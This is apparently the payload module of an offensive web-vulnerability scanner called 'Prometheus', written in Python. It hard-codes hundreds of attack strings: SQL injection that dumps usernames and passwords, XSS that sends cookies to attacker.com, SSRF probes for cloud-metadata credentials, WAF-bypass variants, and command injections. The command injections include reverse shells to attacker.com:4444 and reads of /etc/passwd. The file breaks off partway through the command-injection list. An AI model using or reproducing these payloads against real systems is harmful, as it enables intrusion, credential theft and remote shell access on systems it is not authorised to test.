"""Payload Engine — Smart, lightweight, evolving payload system.

Instead of storing thousands of static payloads, we:
1. Store ~500 core payloads organized by vuln type
2. Generate thousands of variants dynamically (encoding, case, comments)
3. Learn from successful payloads (cache what works)
4. Fetch fresh payloads from online sources when available
5. Context-aware selection (DBMS, WAF, framework, parameter type)

This is what makes Prometheus lightweight yet powerful.
"""

import re
import os
import json
import hashlib
import threading
from pathlib import Path
from typing import List, Dict, Any, Optional, Set, Tuple
from dataclasses import dataclass, field
from datetime import datetime
import itertools

from ..core.logger import logger


@dataclass
class Payload:
    """A single payload with metadata."""
    value: str
    vuln_type: str           # sqli, xss, ssrf, cmdi, ssti, xxe, traversal
    sub_type: str = ""       # error_based, time_based, reflected, stored, dom
    description: str = ""
    severity: str = "HIGH"
    dbms: str = ""           # mysql, postgresql, mssql, oracle, sqlite, generic
    context: str = ""        # html, attribute, js, url, json, xml, css
    framework: str = ""      # jinja2, twig, angular, vue, react, erb, freemarker
    encoding: str = "raw"    # raw, url, double_url, html_entity, unicode, base64
    waf_bypass: bool = False
    source: str = "core"     # core, generated, learned, fetched
    confidence: float = 0.8  # 0.0 to 1.0
    tags: List[str] = field(default_factory=list)

    def __hash__(self):
        return hash(self.value)

    def __eq__(self, other):
        return isinstance(other, Payload) and self.value == other.value


@dataclass
class DetectionPattern:
    """Regex pattern for detecting a vulnerability type."""
    pattern: str
    vuln_type: str
    dbms: str = ""
    description: str = ""
    severity: str = "HIGH"
    confidence: float = 0.9


class PayloadEngine:
    """Smart payload management engine.
    
    Architecture:
    ┌─────────────────────────────────────────┐
    │           PayloadEngine                  │
    │  ┌──────────┐  ┌──────────────────┐     │
    │  │ Core DB  │  │ Transform Engine │     │
    │  │ (~500)   │  │ (encoding, case, │     │
    │  │ YAML     │  │  comments, etc.) │     │
    │  └────┬─────┘  └────────┬─────────┘     │
    │       │                 │               │
    │       ▼                 ▼               │
    │  ┌──────────────────────────────┐       │
    │  │     Context-Aware Selector   │       │
    │  │  (DBMS, WAF, framework,      │       │
    │  │   parameter type)            │       │
    │  └──────────────┬───────────────┘       │
    │                 │                       │
    │       ┌─────────┼─────────┐             │
    │       ▼         ▼         ▼             │
    │  ┌────────┐ ┌────────┐ ┌────────┐      │
    │  │ Learn  │ │ Cache  │ │ Fetch  │      │
    │  │ (what  │ │ (what  │ │ (online│      │
    │  │ works) │ │ works) │ │sources)│      │
    │  └────────┘ └────────┘ └────────┘      │
    └─────────────────────────────────────────┘
    """

    # Singleton pattern
    _instance = None
    _lock = threading.Lock()
    _payloads: Dict[str, List[Payload]] = {}  # vuln_type -> payloads
    _patterns: Dict[str, List[DetectionPattern]] = {}
    _learned: Dict[str, List[str]] = {}  # vuln_type -> learned successful payloads
    _cache_dir: Optional[Path] = None
    _loaded_types: Set[str] = set()

    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._init_engine()
        return cls._instance

    def _init_engine(self):
        """Initialize the payload engine."""
        self._payloads = {}
        self._patterns = {}
        self._learned = {}
        self._loaded_types = set()
        self._cache_dir = Path(__file__).parent.parent.parent / "data" / "payload_cache"
        self._cache_dir.mkdir(parents=True, exist_ok=True)
        self._load_learned()

    # ============================================================
    # CORE PAYLOAD DATABASE — Compact but comprehensive
    # ============================================================

    def _get_core_payloads(self, vuln_type: str) -> List[Payload]:
        """Get core payloads for a vulnerability type. These are the seeds
        from which thousands of variants are generated."""
        
        cores = {
            "sqli": self._core_sqli(),
            "xss": self._core_xss(),
            "ssrf": self._core_ssrf(),
            "cmdi": self._core_cmdi(),
            "ssti": self._core_ssti(),
            "xxe": self._core_xxe(),
            "traversal": self._core_traversal(),
            "smuggling": self._core_smuggling(),
            "idor": self._core_idor(),
            "redirect": self._core_redirect(),
            "cors": self._core_cors(),
            "secrets": self._core_secrets(),
            "headers": self._core_headers(),
            "race": self._core_race(),
            "auth": self._core_auth(),
        }
        return cores.get(vuln_type, [])

    def _core_sqli(self) -> List[Payload]:
        """Core SQLi payloads — seeds for variant generation."""
        p = []
        
        # === ERROR-BASED ===
        # MySQL
        for v in ["'", "\"", "1'", "1\"", "' OR '1'='1", "' OR 1=1--", 
                   "' UNION SELECT NULL--", "' AND 1=CONVERT(int,@@version)--",
                   "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
                   "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
                   "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                   "' AND EXP(~(SELECT * FROM(SELECT version())a))--",
                   "' AND GTI_SUBSET(version(),1)--",
                   "'; SELECT @@version--",
                   "' UNION SELECT 1,@@version,3--",
                   "' UNION SELECT 1,@@version,3,4--",
                   "' UNION SELECT 1,@@version,3,4,5--",
                   "1 UNION SELECT 1,@@version,3--",
                   "' UNION ALL SELECT NULL,NULL,NULL--",
                   "' UNION ALL SELECT 1,2,3--",
                   "' UNION ALL SELECT 1,@@version,3--",
                   "' UNION SELECT table_name FROM information_schema.tables--",
                   "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
                   "' UNION SELECT username,password FROM users--",
                   "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
                   "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--",
                   "' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--",
                   "' AND 1=1--",
                   "' AND 1=2--",
                   "' OR 1=1--",
                   "' OR 1=2--",
                   "admin'--",
                   "admin' #",
                   "' OR ''='",
                   "' OR 'x'='x",
                   "') OR ('1'='1",
                   "') OR ('1'='2",
                   "' OR 1=1#",
                   "' OR 1=1/*",
                   "' /*!50000UNION*//*!50000SELECT*/ 1,2,3--",
                   "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
                   "' UNION/**/SELECT/**/1,2,3--",
                   "' uNiOn SeLeCt 1,2,3--",
                   "' uni<>on sel<>ect 1,2,3--",
                   "' UNION SELECT 1,2,3--",
                   "' UNION SELECT 1,2,3,4--",
                   "' UNION SELECT 1,2,3,4,5--",
                   "' UNION SELECT 1,2,3,4,5,6--",
                   "' UNION SELECT 1,2,3,4,5,6,7--",
                   "' UNION SELECT NULL,NULL,NULL--",
                   "' UNION SELECT NULL,NULL,NULL,NULL--",
                   ]:
            p.append(Payload(v, "sqli", "error_based", dbms="mysql", source="core"))
        
        # PostgreSQL
        for v in ["'", "\"", "' OR '1'='1", "' OR 1=1--", 
                   "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                   "' UNION SELECT NULL,NULL,NULL--",
                   "' AND 1=CAST((SELECT version()) AS int)--",
                   "' AND 1=CAST((SELECT current_database()) AS int)--",
                   "' UNION SELECT 1,version(),3--",
                   "' UNION SELECT tablename FROM pg_tables--",
                   "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
                   "'; SELECT version()--",
                   "' AND 1=(SELECT 1 FROM pg_sleep(3))--",
                   "' OR 1=(SELECT 1 FROM pg_sleep(3))--",
                   "1; SELECT pg_sleep(3)--",
                   "'; CREATE TABLE not_null(id int)--",
                   "' AND 1=1--",
                   "' AND 1=2--",
                   "' OR 1=1#",
                   "' UNION ALL SELECT NULL,NULL,NULL--",
                   ]:
            p.append(Payload(v, "sqli", "error_based", dbms="postgresql", source="core"))
        
        # MSSQL
        for v in ["'", "\"", "' OR '1'='1", "' OR 1=1--",
                   "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                   "' UNION SELECT NULL,NULL,NULL--",
                   "' AND 1=CONVERT(int,@@version)--",
                   "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
                   "'; WAITFOR DELAY '0:0:3'--",
                   "1; WAITFOR DELAY '0:0:3'--",
                   "' IF 1=1 WAITFOR DELAY '0:0:3'--",
                   "' IF 1=2 WAITFOR DELAY '0:0:3'--",
                   "' UNION SELECT 1,@@version,3--",
                   "' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--",
                   "' AND 1=1--",
                   "' AND 1=2--",
                   "'; EXEC xp_cmdshell('whoami')--",
                   "' UNION ALL SELECT NULL,NULL,NULL--",
                   ]:
            p.append(Payload(v, "sqli", "error_based", dbms="mssql", source="core"))
        
        # Oracle
        for v in ["'", "\"", "' OR '1'='1", "' OR 1=1--",
                   "' UNION SELECT NULL FROM dual--",
                   "' UNION SELECT NULL,NULL FROM dual--",
                   "' UNION SELECT NULL,NULL,NULL FROM dual--",
                   "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
                   "' UNION SELECT 1,banner,3 FROM v$version--",
                   "' UNION SELECT table_name FROM all_tables--",
                   "' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--",
                   "' AND 1=1--",
                   "' AND 1=2--",
                   "' UNION ALL SELECT NULL,NULL FROM dual--",
                   ]:
            p.append(Payload(v, "sqli", "error_based", dbms="oracle", source="core"))
        
        # SQLite
        for v in ["'", "\"", "' OR '1'='1", "' OR 1=1--",
                   "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                   "' UNION SELECT NULL,NULL,NULL--",
                   "' UNION SELECT 1,sql,3 FROM sqlite_master--",
                   "' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'--",
                   "' AND 1=1--",
                   "' AND 1=2--",
                   "' UNION ALL SELECT 1,2,3--",
                   ]:
            p.append(Payload(v, "sqli", "error_based", dbms="sqlite", source="core"))
        
        # === TIME-BASED ===
        for v in ["' OR SLEEP(3)--", "' AND SLEEP(3)--", "1 AND SLEEP(3)--",
                   "' OR pg_sleep(3)--", "' AND pg_sleep(3)--",
                   "'; WAITFOR DELAY '0:0:3'--", "' IF 1=1 WAITFOR DELAY '0:0:3'--",
                   "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
                   "' OR benchmark(10000000,SHA1('test'))--",
                   "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                   "' OR (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                   "1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                   "' OR 1=(SELECT 1 FROM pg_sleep(3))--",
                   "' AND 1=(SELECT 1 FROM pg_sleep(3))--",
                   "'; SELECT pg_sleep(3)--",
                   "' WAITFOR DELAY '0:0:3'--",
                   "1; WAITFOR DELAY '0:0:3'--",
                   "' IF (1=1) WAITFOR DELAY '0:0:3'--",
                   "' IF (1=2) WAITFOR DELAY '0:0:3'--",
                   ]:
            p.append(Payload(v, "sqli", "time_based", source="core"))
        
        # === BOOLEAN-BASED ===
        for true_p, false_p in [
            ("' OR '1'='1", "' OR '1'='2"),
            ("1 OR 1=1", "1 OR 1=2"),
            ("' AND '1'='1", "' AND '1'='2"),
            ("' AND 1=1--", "' AND 1=2--"),
            ("' OR 1=1--", "' OR 1=2--"),
            ("1 AND 1=1", "1 AND 1=2"),
            ("' OR 'a'='a", "' OR 'a'='b"),
            ("') OR ('1'='1", "') OR ('1'='2"),
            ("') AND ('1'='1", "') AND ('1'='2"),
            ("' OR 1=1#", "' OR 1=2#"),
            ("' OR 1=1/*", "' OR 1=2/*"),
            ("' OR ''='", "' OR 'x'='y"),
        ]:
            p.append(Payload(true_p, "sqli", "boolean_based", description=f"TRUE: {true_p}", source="core"))
            p.append(Payload(false_p, "sqli", "boolean_based", description=f"FALSE: {false_p}", source="core"))
        
        # === WAF BYPASS ===
        for v in [
            "' /*!50000UNION*//*!50000SELECT*/ 1,2,3--",
            "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
            "' UNION/**/SELECT/**/1,2,3--",
            "' uNiOn SeLeCt 1,2,3--",
            "' uni<>on sel<>ect 1,2,3--",
            "' %55NION %53ELECT 1,2,3--",
            "' %55nion %53elect 1,2,3--",
            "' un%69on sel%65ct 1,2,3--",
            "' /**/UNION/**/SELECT/**/1,2,3--",
            "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
            "' union all select 1,2,3--",
            "' UNION%0ASELECT%0A1,2,3--",
            "' UNION%0DSELECT%0D1,2,3--",
            "' UNION%09SELECT%091,2,3--",
            "' UNION%0BSELECT%0B1,2,3--",
            "' UNION%0CSELECT%0C1,2,3--",
            "' UNION%A0SELECT%AA1,2,3--",
            "' uni/**/on sel/**/ect 1,2,3--",
            "' /*!12345UNION*/ /*!12345SELECT*/ 1,2,3--",
            "' -1 union select 1,2,3--",
            "' 1'union select 1,2,3--",
            "' 1 union select 1,2,3--",
            "' and 1 in (select min(name) from sysobjects where xtype='U' and name>'.' UNION SELECT TOP 1 NULL FROM information_schema.tables)--",
            "' and 1=0 union select 1,2,3--",
            "1' and 1=0 union select 1,@@version,3--",
            "' or 1=1 union select 1,2,3--",
            "' union select 1,2,3,4,5,6,7,8,9,10--",
            "-1 union select 1,2,3--",
            "0 union select 1,2,3--",
            "null union select 1,2,3--",
            "' union select 1,2,3 limit 1--",
            "' union select 1,2,3 into outfile '/tmp/test'--",
            "' union select load_file('/etc/passwd'),2,3--",
            "' and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--",
            "' and extractvalue(1,concat(0x7e,(select version()),0x7e))--",
            "' and updatexml(1,concat(0x7e,(select version()),0x7e),1)--",
            "' and (select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--",
            "' and exp(~(select * from(select version())a))--",
            "' and row(1,1)>(select count(*),concat(version(),0x3a,floor(rand(0)*2))x from (select 1 union select 2)a group by x limit 1)--",
            "' and (select 1 from(select count(*) as cnt from information_schema.tables)as a)=(select 1 from(select count(*) as cnt from information_schema.tables)as b)--",
        ]:
            p.append(Payload(v, "sqli", "waf_bypass", waf_bypass=True, source="core"))
        
        # === POLYGLOT ===
        for v in [
            "'-sleep(3)-'",
            "'-benchmark(10000000,sha1('test'))-'",
            "' or sleep(3) or '",
            "' or pg_sleep(3) or '",
            "'||(select 1 from (select sleep(3))a)||'",
            "'+(select 1 from (select sleep(3))a)+'",
            "';select sleep(3);'",
            "';select pg_sleep(3);'",
            "';waitfor delay '0:0:3';'",
            "'-1 or 1=1--",
            "' and 1=0 union select @@version--",
            "1' and 1=0 union select 1,@@version--",
            "admin' or '1'='1",
            "admin' or '1'='1'--",
            "admin' or '1'='1'#",
            "admin' or '1'='1'/*",
            "admin'/**/or/**/1=1",
            "admin' or 1=1 or ''='",
            "admin') or ('1'='1",
            "admin') or ('1'='1'--",
        ]:
            p.append(Payload(v, "sqli", "polyglot", source="core"))
        
        # === JSON/XML CONTEXT ===
        for v in [
            '{"id": "1 OR 1=1--"}',
            '{"id": "1 UNION SELECT 1,2,3--"}',
            '{"id": {"$gt": ""}}',
            '{"id": {"$ne": ""}}',
            '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
            '<id>1 OR 1=1</id>',
            '<id>1 UNION SELECT 1,2,3</id>',
        ]:
            p.append(Payload(v, "sqli", "json_xml", source="core"))
        
        # === HEADER-BASED ===
        for v in [
            "X-Forwarded-For: ' OR 1=1--",
            "X-Forwarded-For: 1' OR 1=1--",
            "Referer: ' OR 1=1--",
            "User-Agent: ' OR 1=1--",
            "Cookie: ' OR 1=1--",
            "X-Real-IP: ' OR 1=1--",
            "X-Original-URL: ' OR 1=1--",
            "X-Rewrite-URL: ' OR 1=1--",
        ]:
            p.append(Payload(v, "sqli", "header_based", source="core"))
        
        return p

    def _core_xss(self) -> List[Payload]:
        """Core XSS payloads."""
        p = []
        
        # === REFLECTED XSS — Basic ===
        for v in [
            '<script>alert(1)</script>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<script>alert`1`</script>',
            '<script>prompt(1)</script>',
            '<script>confirm(1)</script>',
            '<script>console.log(1)</script>',
            '<script src=https://attacker.com/xss.js></script>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '</script><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<img src=x onerror=alert(1)//',
            '<img src=x onerror=alert(1)>',
            '<img/src=x onerror=alert(1)>',
            '<img src="x" onerror="alert(1)">',
            '<img src=x onerror=alert`1`>',
            '<img src=x oneonerrorrror=alert(1)>',
            '<img src=x onerror=alert&lpar;1&rpar;>',
            '<svg onload=alert(1)>',
            '<svg/onload=alert(1)>',
            '<svg onload=alert(1)//',
            '<svg><script>alert(1)</script></svg>',
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            '<svg><set onbegin=alert(1) attributename=x to=1>',
            '<details open ontoggle=alert(1)>',
            '<details open ontoggle=alert(1)//',
            '<marquee onstart=alert(1)>',
            '<marquee onstart=alert(1)//',
            '<video onerror=alert(1)><source>',
            '<audio onerror=alert(1)><source>',
            '<body onload=alert(1)>',
            '<body onpageshow=alert(1)>',
            '<body onfocus=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<input onblur=alert(1) autofocus><input autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<keygen onfocus=alert(1) autofocus>',
            '<button onclick=alert(1)>click</button>',
            '<div onclick=alert(1)>click</div>',
            '<a href=javascript:alert(1)>click</a>',
            '<a href="javascript:alert(1)">click</a>',
            '<a href=javascript&colon;alert(1)>click</a>',
            '<a href=`javascript:alert(1)`>click</a>',
            '<iframe src=javascript:alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<iframe onload=alert(1)>',
            '<object data=javascript:alert(1)>',
            '<embed src=javascript:alert(1)>',
            '<form action=javascript:alert(1)><input type=submit>',
            '<isindex action=javascript:alert(1) type=image>',
            '<isindex action=javascript:alert(1)>',
            '<math><mtext></mtext><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src>">',
            '<table><td background=javascript:alert(1)>',
            '<a style="position:absolute;top:0;left:0;width:100%;height:100%;display:block" href=javascript:alert(1)>',
        ]:
            p.append(Payload(v, "xss", "reflected", context="html", source="core"))
        
        # === EVENT HANDLERS (PortSwigger style) ===
        # No user interaction needed
        for event in [
            "onload", "onerror", "onpageshow", "onfocus", "onresize",
            "onscroll", "onmouseenter", "onmouseleave", "onmouseover",
            "onmouseout", "onanimationstart", "onanimationend",
            "ontransitionend", "onbegin", "onend",
        ]:
            p.append(Payload(f'<svg {event}=alert(1)>', "xss", "reflected", context="html", tags=["event_handler"], source="core"))
        
        # User interaction needed
        for event in [
            "onclick", "ondblclick", "onmousedown", "onmouseup",
            "onkeydown", "onkeyup", "onkeypress", "onchange",
            "onsubmit", "onreset", "onselect", "onblur",
            "oncopy", "oncut", "onpaste", "ondrag", "ondrop",
        ]:
            p.append(Payload(f'<div {event}=alert(1)>X</div>', "xss", "reflected", context="html", tags=["event_handler"], source="core"))
        
        # === ATTRIBUTE CONTEXT ===
        for v in [
            '" onmouseover="alert(1)"',
            "' onmouseover='alert(1)'",
            '" onfocus="alert(1)" autofocus="',
            "' onfocus='alert(1)' autofocus='",
            '" onmouseover=alert(1) "',
            "' onmouseover=alert(1) '",
            '" onclick="alert(1)" "',
            "' onclick='alert(1)' '",
            '" style="background:url(javascript:alert(1))"',
            '" style="xss:expression(alert(1))"',
            '-alert(1)-',
            '`-alert(1)-`',
            '{{constructor.constructor("alert(1)")()}}',
        ]:
            p.append(Payload(v, "xss", "reflected", context="attribute", source="core"))
        
        # === JAVASCRIPT CONTEXT ===
        for v in [
            '</script><script>alert(1)</script>',
            '-alert(1)-',
            ';alert(1)//',
            "\\';alert(1)//",
            '"-alert(1)-"',
            '";alert(1)//',
            "'-alert(1)-'",
            '`-alert(1)-`',
            '${alert(1)}',
            '{{alert(1)}}',
            'alert(1)',
            'confirm(1)',
            'prompt(1)',
            'console.log(document.cookie)',
            'document.location="https://attacker.com/?c="+document.cookie',
        ]:
            p.append(Payload(v, "xss", "reflected", context="javascript", source="core"))
        
        # === URL CONTEXT ===
        for v in [
            'javascript:alert(1)',
            'javascript:alert(1)//',
            'javascript:alert(1)/*',
            'data:text/html,<script>alert(1)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'javascript:alert(document.cookie)',
            'javascript:setTimeout("alert(1)")',
            'jAvAsCrIpT:alert(1)',
            'java\x00script:alert(1)',
            'java\tscript:alert(1)',
            'java\nscript:alert(1)',
            'java\rscript:alert(1)',
        ]:
            p.append(Payload(v, "xss", "reflected", context="url", source="core"))
        
        # === STORED XSS ===
        for v in [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src>">',
            '<a href=javas&#99;ript:alert(1)>click</a>',
            '"><img src=x onerror=alert(1)>',
            "';alert(1)//",
            '"><script>alert(1)</script>',
            '<img src=1 href=1 onerror="javascript:alert(1)">',
            '<svg><script href=data:,alert(1) /></svg>',
            '<svg><use href=data:image/svg+xml;base64,PHN2ZyBpZD0geCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4=#x></use></svg>',
        ]:
            p.append(Payload(v, "xss", "stored", context="html", source="core"))
        
        # === DOM XSS ===
        for v in [
            '#<script>alert(1)</script>',
            '#"><img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"><svg onload=alert(1)>',
            "'-alert(1)-'",
            '{{constructor.constructor("alert(1)")()}}',
            '${alert(1)}',
            '{{7*7}}',
        ]:
            p.append(Payload(v, "xss", "dom", source="core"))
        
        # === WAF BYPASS ===
        for v in [
            '<img src=x onerror=alert`1`>',
            '<svg/onload=alert`1`>',
            '<details open ontoggle=alert`1`>',
            '<img/src=x onerror=alert(1)>',
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<SCRIPT>alert(1)</SCRIPT>',
            '<ScRiPt>alert(1)</ScRiPt>',
            '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>',
            '<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>',
            '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
            '<svg onload=eval(atob("YWxlcnQoMSk="))>',
            '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
            '<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
            '<img src=x onerror=window["al"+"ert"](1)>',
            '<svg onload=window["al"+"ert"](1)>',
            '<img src=x onerror=self["al"+"ert"](1)>',
            '<img src=x onerror=top["al"+"ert"](1)>',
            '<img src=x onerror=parent["al"+"ert"](1)>',
            '<img src=x onerror=frames["al"+"ert"](1)>',
            '<img src=x onerror=this["al"+"ert"](1)>',
            '<img src=x onerror=Reflect.apply(alert,this,[1])>',
            '<svg onload=new Function("alert(1)")>',
            '<img src=x onerror=new Function("alert(1)")>',
            '<svg onload=setTimeout("alert(1)")>',
            '<img src=x onerror=setTimeout("alert(1)")>',
            '<svg onload=setInterval("alert(1)")>',
            '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src>">',
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            '<svg><set onbegin=alert(1) attributename=x to=1>',
            '<marquee onstart=alert(1)>',
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            '<style>@import"javascript:alert(1)"</style>',
            '<link rel=import href="data:text/html,<script>alert(1)</script>">',
        ]:
            p.append(Payload(v, "xss", "waf_bypass", waf_bypass=True, source="core"))
        
        # === FRAMEWORK-SPECIFIC (PortSwigger research) ===
        # AngularJS sandbox escape
        for v in [
            '{{constructor.constructor("alert(1)")()}}',
            '{{a=constructor.prototype;b={a:"alert(1)"};a.constructor.prototype.charAt=[].join;$eval("x",b)}}',
            '{{\'a\'.constructor.prototype.charAt=[].join;$eval("x,1)}{}alert(1)//\');}}',
            '{{x = {"y".constructor.prototype}; x["y"].constructor.prototype.charAt=[].join;$eval("x,alert(1)//");}}',
            '{{toString.constructor.prototype.charAt=[].join;$eval("toString.constructor.prototype.charAt=[].join;$eval")}}',
            '{{toString().constructor.prototype.charAt=[].join;$eval("x=alert(1)//")}}',
        ]:
            p.append(Payload(v, "xss", "reflected", framework="angular", source="core"))
        
        # VueJS
        for v in [
            '{{constructor.constructor("alert(1)")()}}',
            '{{_c.constructor("alert(1)")()}}',
            '{{$emit.constructor("alert(1)")()}}',
            '{{constructor.constructor("alert(1)")()}}',
        ]:
            p.append(Payload(v, "xss", "reflected", framework="vue", source="core"))
        
        return p

    def _core_ssrf(self) -> List[Payload]:
        """Core SSRF payloads."""
        p = []
        
        # Cloud metadata
        for v in [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/dynamic/instance-identity/',
            'http://169.254.169.254/computeMetadata/v1/',
            'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email',
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=json',
            'http://100.100.100.200/latest/meta-data/',
            'http://100.100.100.200/latest/meta-data/ram/security-credentials/',
        ]:
            p.append(Payload(v, "ssrf", "cloud", source="core"))
        
        # Internal network
        for v in [
            'http://127.0.0.1/', 'http://localhost/', 'http://0.0.0.0/',
            'http://[::1]/', 'http://[::ffff:127.0.0.1]/',
            'http://0177.0.0.1/', 'http://0x7f.0x00.0x00.0x01/',
            'http://2130706433/', 'http://0x7f000001/',
            'http://017700000001/', 'http://127.0.0.1:80/',
            'http://127.0.0.1:443/', 'http://127.0.0.1:8080/',
            'http://127.0.0.1:8443/', 'http://127.0.0.1:3000/',
            'http://127.0.0.1:5000/', 'http://127.0.0.1:9090/',
            'http://10.0.0.1/', 'http://10.0.0.2/',
            'http://172.16.0.1/', 'http://172.16.0.2/',
            'http://192.168.0.1/', 'http://192.168.1.1/',
            'http://192.168.0.100/', 'http://192.168.1.100/',
        ]:
            p.append(Payload(v, "ssrf", "internal", source="core"))
        
        # Protocol smuggling
        for v in [
            'file:///etc/passwd', 'file:///etc/hosts', 'file:///proc/self/environ',
            'file:///proc/self/cmdline', 'file:///var/log/apache2/access.log',
            'file:///c:/windows/system32/drivers/etc/hosts',
            'file:///c:/windows/win.ini',
            'gopher://127.0.0.1:25/', 'gopher://127.0.0.1:6379/',
            'gopher://127.0.0.1:3306/', 'gopher://127.0.0.1:5432/',
            'dict://127.0.0.1:6379/', 'dict://127.0.0.1:11211/',
            'ldap://127.0.0.1/', 'tftp://127.0.0.1/',
            'http://attacker.com/', 'https://attacker.com/',
            'php://filter/convert.base64-encode/resource=/etc/passwd',
            'php://filter/convert.base64-encode/resource=index.php',
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+',
            'expect://id', 'zip://test.jpg%23shell.php',
            'jar:http://attacker.com/test.jar!/',
        ]:
            p.append(Payload(v, "ssrf", "protocol", source="core"))
        
        # URL bypass tricks
        for v in [
            'http://127.0.0.1@attacker.com/',
            'http://attacker.com#@127.0.0.1/',
            'http://attacker.com%00@127.0.0.1/',
            'http://127.0.0.1%2523@attacker.com/',
            'http://attacker.com\\@127.0.0.1/',
            'http://127.0.0.1#@attacker.com/',
            'http://0x7f000001/',
            'http://0177.0.0.1/',
            'http://127.1/', 'http://127.0.1/',
            'http://127.0.0.1.nip.io/',
            'http://localtest.me/',
            'http://spoofed.burpcollaborator.net/',
        ]:
            p.append(Payload(v, "ssrf", "bypass", waf_bypass=True, source="core"))
        
        return p

    def _core_cmdi(self) -> List[Payload]:
        """Core command injection payloads."""
        p = []
        # Linux
        for v in [
            ';id', '|id', '`id`', '$(id)', '; whoami', '| whoami',
            '; cat /etc/passwd', '| cat /etc/passwd',
            '`cat /etc/passwd`', '$(cat /etc/passwd)',
            '; ls -la', '| ls -la', '; uname -a', '| uname -a',
            '; ping -c 3 attacker.com', '| ping -c 3 attacker.com',
            '`ping -c 3 attacker.com`', '$(ping -c 3 attacker.com)',
            '; curl http://attacker.com/', '| curl http://attacker.com/',
            '; wget http://attacker.com/', '| wget http://attacker.com/',
            '; nc -e /bin/sh attacker.com 4444',
            '| nc -e /bin/sh attacker.com 4444',
            '; bash -i >& /dev/tcp/attacker.com/4444 0>&1',
            '; python -c "import socket,os,pty;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")"; ',
            '; sleep 5', '| sleep 5', '`sleep 5`', '$(sleep 5)',
            '; timeout 5 ping attacker.com',
            "w'h'o'am'i", 'w"h"o"a"m"i', "c''at /etc/passwd",
            'c""at /etc/passwd', '${IFS}cat${IFS}/etc/passwd',
            'cat${IFS}/etc/passwd', 'cat$IFS/etc/passwd',
            ';cat /etc/passwd', '|cat /etc/passwd',
            ';{cat,/etc/passwd}', '|{cat,/etc/passwd}',
            '; echo $(cat /etc/passwd)',
            '&& id', '|| id', '; id #', 'id',
            '%0aid', '%0a id', '\\n id',
            '; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh',
            '; python3 -c "import os;os.system(\'id\')"',
